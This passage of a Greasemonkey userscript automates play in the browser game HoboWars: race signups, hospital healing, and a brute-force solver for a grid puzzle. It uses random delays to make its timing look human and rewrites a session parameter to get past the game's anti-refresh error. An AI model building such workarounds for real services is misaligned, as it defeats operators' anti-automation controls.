        WorkBox.innerHTML = WorkBox.innerHTML.substring(0, b) + c + WorkBox.innerHTML.substring(b);
    }
	
	
	function DoHomeStuff() {
		var cCount = GM_getValue(HoboVersion+"HOMELOADS");
		cCount = cCount + 1;
		if (cCount >= CheckForUpdateEvery) {
			GM_setValue(HoboVersion+"HOMELOADS",0)
			CheckForUpdates();
		} else {
			GM_setValue(HoboVersion+"HOMELOADS",cCount)
		}
		//alert(cCount);
	}
	
	//*--------------------------------*
	//        Suicide Hill Functions
	//*--------------------------------*

    function doSuicideHillAutoSignup() {
        if (macroCheck()) {
            return;
        }
        var a = whiteBox.innerHTML.indexOf("race?  You have");
        if (a == -1) {
            return;
        }
        a = whiteBox.innerHTML.substring(a).indexOf("</b>") + whiteBox.innerHTML.substring(0, a).length - 1;
        if (whiteBox.innerHTML.substring(a, a + 1) < 1) {
            return;
        }
        var b = document.getElementsByTagName("form");
        if (b.length != 1) {
            return;
        }
        for (var c = 0; c < b.length; c++) {
            if (b[c].name == "form1") {
                setTimeout(function () {document.getElementsByTagName("form")[0].submit();}, Math.floor(Math.random() * 1000));
            }
        }
    }

	
	function doGarageAutoback() {
        if (macroCheck()) {
            return;
        }
        if (args.do == "unequip_all" ||
            args.do == "rename2" ||
            args.do == "equip_upg" ||
            args.do == "sell_upg" && args.doo == "1" ||
            (args.do == "sell_cart" && args.doo == "1")) {
            var a = location.href.split("?")[0];
            setTimeout(function () {location.href = a + "?sr=" + args.sr + "&cl=" + ((args.cl == "9") ? "1" : parseInt(args.cl) + 1) + "&cmd=hill&do=garage";}, GetDelay());
        }
    }
	
	//*--------------------------------*
	//        Hospital functions
	//*--------------------------------*
		
    function doHospitalAutoheal() {
        if (macroCheck()) {
            return;
        }
        var a = document.getElementsByTagName("a");
        for (var b = 0; b < a.length; b++) {
            if (a[b].text == "I need a good healing, heal me to full health..." &&
                GM_getValue(HoboVersion+"hospitalautoheal_choice",0) == 0) {
                var c = a[b].href;
				GotoLocation(c);	
            } else if (a[b].text == "Let my gang cover part of the cost" &&
                GM_getValue(HoboVersion+"hospitalautoheal_choice",0) == 1) {
                var c = a[b].href;
				GotoLocation(c);
            }
        }
    }
	
	//*--------------------------------*
	//        University Functions
	//*--------------------------------*

    function setupUniversity() {
        if (macroCheck()) {
            return;
        }
        loadUniversityPuzzle();
        if (GM_getValue(HoboVersion+"university_currentpuzzle") != puzzleToString(uniPuzzle)) {
            solveUniversityPuzzle();
        }
        if (GM_getValue(HoboVersion+"enable_universitylocktrain",false)) {
            lockUniversityTrainLinks();
        }
        showUniversityScore();
        if (whiteBox.innerHTML.indexOf("<center><b><font color=\"red\">you do not have $50 on you.</font></b></center>") != -1 || whiteBox.innerHTML.indexOf("<center><b><font color=\"red\">you do not have 10 t.</font></b></center>") != -1) {
            return;
        }
        if (GM_getValue(HoboVersion+"university_solving",false) == true) {
            doNextUniversityMove();
        } else {
            showUniversitySolveButton();
        }
    }


    function showUniversityScore() {
        var a = whiteBox.innerHTML.indexOf("Gain: <font");
        if (a == -1 || GM_getValue(HoboVersion+"university_maxscore") == null) {
            return;
        }
        whiteBox.innerHTML = whiteBox.innerHTML.substring(0, a) + "Max Points: <font size=\"2\" color=\"#006600\">" + GM_getValue(HoboVersion+"university_maxscore") + "</font><br>" + whiteBox.innerHTML.substring(a);
    }


    function showUniversitySolveButton() {
		var a = "";
		if (HoboVersion == 1) {
			a = whiteBox.innerHTML.indexOf("<br><br>NB! Training costs");
		} else {
			a = whiteBox.innerHTML.indexOf("<br><br>Training costs");
		}
        if (a == -1 || GM_getValue(HoboVersion+"university_maxscore") == null) {
            return;
        }
        if (getUniversityPuzzleScore() < GM_getValue(HoboVersion+"university_maxscore")) {
            whiteBox.innerHTML = whiteBox.innerHTML.substring(0, a) + "<br><br><center><button id=\"start_solve\">Solve</button></center>" + whiteBox.innerHTML.substring(a);
            document.getElementById("start_solve").addEventListener("click", universityStartSolve, false);
        } else {
            whiteBox.innerHTML = whiteBox.innerHTML.substring(0, a) + "<br><br><center><button id=\"start_solve\" disabled=\"disabled\">Solved</button></center>" + whiteBox.innerHTML.substring(a);
        }
    }


    function lockUniversityTrainLinks() {
        var a = document.getElementsByTagName("a");
        for (var b = 0; b < a.length; b++) {
            if (a[b].href.indexOf("&cmd=uni&do=str") != -1 &&
                GM_getValue(HoboVersion+"universitylocktrain_choice",0) != 0) {
                a[b].style.visibility = "hidden";
            }
            if (a[b].href.indexOf("&cmd=uni&do=pow") != -1 &&
                GM_getValue(HoboVersion+"universitylocktrain_choice",0) != 1) {
                a[b].style.visibility = "hidden";
            }
            if (a[b].href.indexOf("&cmd=uni&do=int") != -1 &&
                GM_getValue(HoboVersion+"universitylocktrain_choice",0) != 2) {
                a[b].style.visibility = "hidden";
            }
            if (a[b].href.indexOf("&cmd=uni&do=spd") != -1 &&
                GM_getValue(HoboVersion+"universitylocktrain_choice",0) != 3) {
                a[b].style.visibility = "hidden";
            }
        }
    }


    function universityStartSolve() {
	    GM_setValue(HoboVersion+"university_solving", true);
        doNextUniversityMove();
    }


    function doNextUniversityMove() {
        var c = {};
        var a = document.getElementsByTagName("a");
        for (var b = 0; b < a.length; b++) {
            if (a[b].href.indexOf("&do=col&col=1") != -1) {
                c.E = a[b].href;
            } else if (a[b].href.indexOf("&do=col&col=2") != -1) {
                c.F = a[b].href;
            } else if (a[b].href.indexOf("&do=col&col=3") != -1) {
                c.G = a[b].href;
            } else if (a[b].href.indexOf("&do=col&col=4") != -1) {
                c.H = a[b].href;
            } else if (a[b].href.indexOf("&do=row&row=1") != -1) {
                c.D = a[b].href;
            } else if (a[b].href.indexOf("&do=row&row=2") != -1) {
                c.C = a[b].href;
            } else if (a[b].href.indexOf("&do=row&row=3") != -1) {
                c.B = a[b].href;
            } else if (a[b].href.indexOf("&do=row&row=4") != -1) {
                c.A = a[b].href;
            }
        }
        if (GM_getValue(HoboVersion+"university_solution").length == 0) {
            solveUniversityPuzzle();
            showUniversitySolveButton();
            return;
        }
        var d = c[GM_getValue(HoboVersion+"university_solution").substring(0, 1)];
        if (d.length < 1) {
            solveUniversityPuzzle();
            showUniversitySolveButton();
            return;
        }
        setNextPuzzle(GM_getValue(HoboVersion+"university_solution").substring(0, 1));
        GM_setValue(HoboVersion+"university_solution", GM_getValue(HoboVersion+"university_solution").substring(1));
		GotoLocation(d);
    }


    function setNextPuzzle(a) {
        if (a == "A" || a == "B" || a == "C" || a == "D") {
            var y;
            switch (a) {
              case "A":
                y = 3;
                break;
              case "B":
                y = 2;
                break;
              case "C":
                y = 1;
                break;
              case "D":
                y = 0;
              default:;
            }
            for (x = 0; x < 4; x++) {
                (uniPuzzle[y][x] == 2) ? (uniPuzzle[y][x] = 0) : uniPuzzle[y][x]++;
            }
        } else {
            var x;
            switch (a) {
              case "E":
                x = 0;
                break;
              case "F":
                x = 1;
                break;
              case "G":
                x = 2;
                break;
              case "H":
                x = 3;
              default:;
            }
            for (y = 0; y < 4; y++) {
                (uniPuzzle[y][x] == 2) ? (uniPuzzle[y][x] = 0) : uniPuzzle[y][x]++;
            }
        }
        GM_setValue(HoboVersion+"university_currentpuzzle", puzzleToString(uniPuzzle));
    }


    function getUniversityPuzzleScore() {
        var a = 0;
        for (var x = 0; x < 4; x++) {
            for (var y = 0; y < 4; y++) {
                switch (uniPuzzle[x][y]) {
                  case 0:
                    a--;
                    break;
                  case 2:
                    a++;
                  default:;
                }
            }
        }
        return a;
    }


    function loadUniversityPuzzle() {
        var a = whiteBox.getElementsByTagName("img"), x = 0, y = 0;
        for (var b = 0; b < a.length; b++) {
            if (a[b].title == "yellow" &&
                a[b].src.indexOf("/yellow.gif") != -1) {
                uniPuzzle[y][x] = 1;
                x++;
            } else if (a[b].title == "green" &&
                a[b].src.indexOf("/green.gif") != -1) {
                uniPuzzle[y][x] = 2;
                x++;
            } else if (a[b].title == "red" && a[b].src.indexOf("/red.gif") != -1) {
                uniPuzzle[y][x] = 0;
                x++;
            }
            if (x > 3) {
                x = 0;
                y++;
            }
        }
    }


    function puzzleToString(a) {
        var b = "";
        for (var x = 0; x < 4; x++) {
            for (var y = 0; y < 4; y++) {
                b += "" + a[x][y];
            }
        }
        return b;
    }


    function stringToPuzzle(a) {
        var b = Array(Array(1, 1, 1, 1), Array(1, 1, 1, 1), Array(1, 1, 1, 1), Array(1, 1, 1, 1));
        for (var x = 0; x < 4; x++) {
            for (var y = 0; y < 4; y++) {
                b[x][y] = a.substring((x * 4) + y, 1) + 0;
            }
        }
        return b;
    }


    function solveUniversityPuzzle() {
        var c, moves, bestMoves = 0, bestScore = 0, moveString = "";
        var d = 0, C2 = 0, C3 = 0, C4 = 0, R1 = 0, R2 = 0, R3 = 0, R4 = 0;
        for (var i = 0; i <= 2; ++i) {
            for (var j = 0; j <= 2; ++j) {
                for (var k = 0; k <= 2; ++k) {
                    for (var l = 0; l <= 2; ++l) {
                        for (var m = 0; m <= 2; ++m) {
                            for (var n = 0; n <= 2; ++n) {
                                for (var o = 0; o <= 2; ++o) {
                                    for (var p = 0; p <= 2; ++p) {
                                        var e = 0;
                                        var f = Array(i, j, k, l);
                                        var g = Array(m, n, o, p);
                                        for (var a = 0; a < 4; ++a) {
                                            for (var b = 0; b < 4; ++b) {
                                                c = uniPuzzle[a][b] + f[a] + g[b];
                                                while (c > 2) {
                                                    c -= 3;
                                                }
                                                e += c;
                                            }
                                        }
                                        e -= 16;
                                        moves = i + j + k + l + m + n + o + p;
                                        if (e > bestScore ||
                                            (e == bestScore &&
                                            moves < bestMoves)) {
                                            bestMoves = moves;
                                            bestScore = e;
                                            R1 = i;
                                            R2 = j;
                                            R3 = k;
                                            R4 = l;
                                            d = m;
                                            C2 = n;
                                            C3 = o;
                                            C4 = p;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        if (R1 > 0) {
            for (var i = 0; i < R1; i++) {
                moveString += "D";
            }
        }
        if (R2 > 0) {
            for (var i = 0; i < R2; i++) {
                moveString += "C";
            }
        }
        if (R3 > 0) {
            for (var i = 0; i < R3; i++) {
                moveString += "B";
            }
        }
        if (R4 > 0) {
            for (var i = 0; i < R4; i++) {
                moveString += "A";
            }
        }
        if (d > 0) {
            for (var i = 0; i < d; i++) {
                moveString += "E";
            }
        }
        if (C2 > 0) {
            for (var i = 0; i < C2; i++) {
                moveString += "F";
            }
        }
        if (C3 > 0) {
            for (var i = 0; i < C3; i++) {
                moveString += "G";
            }
        }
        if (C4 > 0) {
            for (var i = 0; i < C4; i++) {
                moveString += "H";
            }
        }
        GM_setValue(HoboVersion+"university_maxscore", bestScore);
        GM_setValue(HoboVersion+"university_solution", moveString);
        GM_setValue(HoboVersion+"university_currentpuzzle", puzzleToString(uniPuzzle));
        GM_setValue(HoboVersion+"university_solving", false);
    }

	//*--------------------------------*
	//        Misc Functions
	//*--------------------------------*
	
	function GotoLocation(GotoPath) {
		//This function is here so that we can add a delay
		var DELAY = GetDelay();
		setTimeout(function () {location.href = GotoPath;}, DELAY);
	}
	
	
	function GetDelay() {
		var tFrom = parseFloat(GM_getValue(HoboVersion+"DELAYFROM")) * 1000;
		var tTo = parseFloat(GM_getValue(HoboVersion+"DELAYTO")) * 1000;
		var DELAY = tFrom + Math.floor(Math.random() * (tTo - tFrom));
		return DELAY;		
	}
	
	
	function removeHTMLTags(strInputCode){
 	 	strInputCode = strInputCode.replace(/&(lt|gt);/g, function (strMatch, p1){
 		 	return (p1 == "lt")? "<" : ">";
 		});
 		var strTagStrippedText = strInputCode.replace(/<\/?[^>]+(>|$)/g, "");
 		return strTagStrippedText
	}
	
	
	function CheckGameVersion() {
		var Host = window.location.hostname
		if (Host.indexOf("hobowars.com") != -1){
			var WindowLoc = window.location.href
			if (WindowLoc.indexOf("hobowars.com/fb/") != -1) {
				return 3;
			} else {
				return 0;
			}
		} else if (Host.indexOf("hobowars2.com") != -1){
			return 1;
		}
	}
	
	
	function macroCheck() {
        var a = document.getElementsByTagName("img");
        for (var b = 0; b < a.length; b++) {
		    if (a[b].src.indexOf("/captcha.php?") != -1) {
                return true;
            }
        }
		// also add a refresh check as well as its pretty much the same thing
		if (document.body.innerHTML.indexOf("You can not refresh") != -1) {
			return true;
		}				
        return false;
    }
	
	
	function TimeStamp() {
		var currentTime = new Date()
		var month = currentTime.getMonth() + 1
		var day = currentTime.getDate()
		var year = currentTime.getFullYear()
		var min = currentTime.getMinutes() // - Number of minutes (0-59)
		var hour = currentTime.getHours() // - Number of hours (0-23)
		var Stamp = month + "/" + day
		return Stamp;
	}
	
	
	function getArgs() {
        var a = {};
        var b = document.location.href;
        var c = b.substring(b.indexOf("?") + 1);
        var d = c.split("&");
        for (k in d) {
            var e = d[k].split("=");
            a[e[0]] = e[1];
        }
        return a;
    }
	
	
	function getStringArgs(inString) {
        var a = {};
        var b = inString;
        var c = b.substring(b.indexOf("?") + 1);
        var d = c.split("&");
        for (k in d) {
            var e = d[k].split("=");
            a[e[0]] = e[1];
        }
        return a;
    }

	
	function getRespect() {
        var a = whiteBox.innerHTML.indexOf("Respect:");
        if (a != -1) {
            a = whiteBox.innerHTML.substring(a);
            a = a.substring(a.indexOf("("));
            a = a.substring(a.indexOf(">") + 1);
            a = a.substring(0, a.indexOf("<"));
            a = a.replace(/\,/g,'');
            return a;            
        } else {
            return false;
        }
    }
	
	
	function GetString(HideNumb) {
		var menu=new Array("info","more_info","food");
		var ReturnString = "javascript:";
		for (var i = 0; i < 3; i++) {
			if (i == HideNumb) {
				ReturnString += "document.getElementById(\"" + menu[i] + "\").style.display = \"block\";";
			} else {
				ReturnString += "document.getElementById(\"" + menu[i] + "\").style.display = \"none\";";
			}
		}
		ReturnString += "void(0);";
		return ReturnString;
	}
	

	function addCommas(a) {
        a += "";
        var b = /(\d+)(\d{3})/;
        while (b.test(a)) {
            a = a.replace(b, "$1,$2");
        }
        return a;
    }
	
	
	function CheckForRefresh() {
		//built in macro check becuase the basic macro check has an antirefresh checker.
		var a = document.getElementsByTagName("img");
        for (var b = 0; b < a.length; b++) {
		    if (a[b].src.indexOf("/captcha.php?") != -1) {
                return;
            }
        }
		if (!GM_getValue(HoboVersion+"enable_refresh",false)) {
			return;
		}
		var html = document.body.innerHTML;
		if (html.indexOf("This error will continue to appear if you try to refresh.") != -1) {
			var src = GetCurrentSrc();
			var GotoPath = window.location.href.replace("?sr=" + args.sr,"?sr=" + src);
			GotoLocation(GotoPath);
		}
	}

	
	function GotoCMD(CMD) {
		var src = GetCurrentSrc();
		var GotoPath = "http://" + window.location.hostname + window.location.pathname + "?sr=" + src + "&cmd=" + CMD;
		GotoLocation(GotoPath);
	}
	
	
	function GotoCMDFast(CMD,Delay) {
		var src = GetCurrentSrc();
		var GotoPath = "http://" + window.location.hostname + window.location.pathname + "?sr=" + src + "&cmd=" + CMD;
		setTimeout(function () {location.href = GotoPath;}, 0);
	}
	
	
	function GetCurrentSrc() {
		var hrefs = document.getElementsByTagName("a");
		var src = 0;
        for (var i = 0; i < hrefs.length; i++) {
            if (hrefs[i].href.indexOf("game.php?sr=") != -1) {
				src = GetTextBetween(hrefs[i].href,"game.php?sr=","&cmd")
				return src;
            }			
        }
	}
		
	
	function InsertTextAfter(LookText,FindText,InsertText) {
		var a = LookText.indexOf(FindText);
		var ReturnString = LookText.substring(0,(a + FindText.length)) + InsertText + LookText.substring(a + FindText.length);
		return ReturnString;
	}

	
	function GetTextBetween(LookText,StartText,EndText) {
		var a = LookText.indexOf(StartText);
		var b = LookText.indexOf(EndText,a+StartText.length);
		var ReturnString = LookText.substring((a + StartText.length),b);
		return ReturnString;
	}	
	
	
	function Left(str, n){
		if (n <= 0) {
			return "";
		} else if (n > String(str).length) {
			return str;
		} else {
			return String(str).substring(0,n);
		}
	}
	
	
	function Right(str, n){
		if (n <= 0) {
		   return "";
		} else if (n > String(str).length) {
		   return str;
		} else {
		   var iLen = String(str).length;
		   return String(str).substring(iLen, iLen - n);
		}
	}

	
	function insertAfter( referenceNode, newNode )	{
		referenceNode.parentNode.insertBefore( newNode, referenceNode.nextSibling );
	}
	
	